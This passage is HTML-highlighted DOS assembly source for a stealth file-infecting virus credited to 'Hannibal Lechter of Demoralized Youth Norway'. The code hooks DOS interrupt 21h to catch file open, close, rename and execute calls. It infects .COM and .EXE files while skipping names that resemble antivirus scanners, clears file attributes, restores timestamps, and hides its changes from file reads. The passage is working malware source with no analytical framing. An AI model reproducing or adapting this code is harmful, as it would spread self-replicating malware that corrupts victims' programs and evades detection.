                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">body</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0C001h</span><span class="sc0">

                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0D00Dh</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">o24</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">o13</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">body</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">o24</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">o24</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni24</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">


                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">;close ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">vvv</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">                  </span><span class="sc1">;duplicate handle</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">doit</span><span class="sc0">
</span><span class="sc5">vvv</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">                  </span><span class="sc1">;rename ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dsdx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">;chmod ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dsdx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_open</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pas_wp</span><span class="sc0">
</span><span class="sc5">not_open</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc1">;   cmp     ah,3Dh                  ;open ?</span><span class="sc0">
             </span><span class="sc1">;   je      dsdx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">                </span><span class="sc1">;execute ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc5">dsdx</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                </span><span class="sc1">;open the file</span><span class="sc0">
</span><span class="sc5">doit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">reset_i24</span><span class="sc0">

</span><span class="sc5">glemmdet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc5">alfa</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                         </span><span class="sc1">;JMP FAR xxxx:xxxx</span><span class="sc0">
</span><span class="sc5">org21</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">avslussen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">one_three</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">avslussen</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PCBB v11 (c) Hannibal Lechter of Demoralized Youth Norway'</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Try to stealth a HANDLE READ (3Fh)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc5">_read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">alfa</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">alfa</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">alfa</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">back2</span><span class="sc0">

                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">org21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">back3</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">pos</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">stealth1st</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc1">;x_first3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">first_b2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">first_b1</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">first_b2</span><span class="sc0">
</span><span class="sc5">first_b1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">back3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">back2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stat2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">alfa</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Close the file</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_time</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_date</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

</span><span class="sc1">;                mov     al,byte cs:[ofs_attr]</span><span class="sc0">
</span><span class="sc1">;                mov     byte [di+4],al</span><span class="sc0">

</span><span class="sc1">;               mov     ax,4301h</span><span class="sc0">
</span><span class="sc1">;               mov     cx,word cs:[ofs_attr]</span><span class="sc0">
</span><span class="sc1">;               call    int21</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;db 'Now I lay me down to sleep, I pray the lord my soul to keep, If I die before '</span><span class="sc0">
</span><span class="sc1">;db 'I wake, I pray the lord my soul to take'</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;start NOP'ing here...</span><span class="sc0">
</span><span class="sc1">;              push    es</span><span class="sc0">
</span><span class="sc1">;              push    bx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              mov     ax,3513h</span><span class="sc0">
</span><span class="sc1">;              int     21h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              mov     cs:o13[0],bx</span><span class="sc0">
</span><span class="sc1">;              mov     cs:o13[2],es</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              mov     ah,13h</span><span class="sc0">
</span><span class="sc1">;              int     2Fh</span><span class="sc0">
</span><span class="sc1">;              push    es</span><span class="sc0">
</span><span class="sc1">;              push    bx</span><span class="sc0">
</span><span class="sc1">;              int     2Fh</span><span class="sc0">
</span><span class="sc1">;              pop     dx</span><span class="sc0">
</span><span class="sc1">;              pop     ds</span><span class="sc0">
</span><span class="sc1">;              mov     ax,2513h</span><span class="sc0">
</span><span class="sc1">;              int     21h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              pop     bx</span><span class="sc0">
</span><span class="sc1">;              pop     es</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;stop NOP'ing here...</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                        </span><span class="sc1">;get file-table entry</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;save attr &amp; open-mode</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_attr</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">sft_size</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close1v</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">sft_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">f_size</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_name</span><span class="sc0">

</span><span class="sc5">not_exe</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close1v</span><span class="sc0">  </span><span class="sc1">;jne</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_name</span><span class="sc0">
</span><span class="sc5">close1v</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close1</span><span class="sc0">

</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc12">'V'</span><span class="sc0">           </span><span class="sc1">;name is V*.* ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc12">'F'</span><span class="sc0">           </span><span class="sc1">;name is F*.* ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                            </span><span class="sc1">;name is *SC*.* ?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CS'</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">SCloop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">scasw</span><span class="sc0">
                </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">SCloop</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;open for read/write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;clear attributes</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_info</span><span class="sc0">
</span><span class="sc5">_call1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close2</span><span class="sc0">
</span><span class="sc1">;                push    [di+0Dh]</span><span class="sc0">
</span><span class="sc1">;                push    [di+0Fh]</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">patch_it</span><span class="sc0">
</span><span class="sc5">_call0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                pop     [di+0Fh]</span><span class="sc0">
</span><span class="sc1">;                pop     [di+0Dh]</span><span class="sc0">
</span><span class="sc5">close2</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;close after infection</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

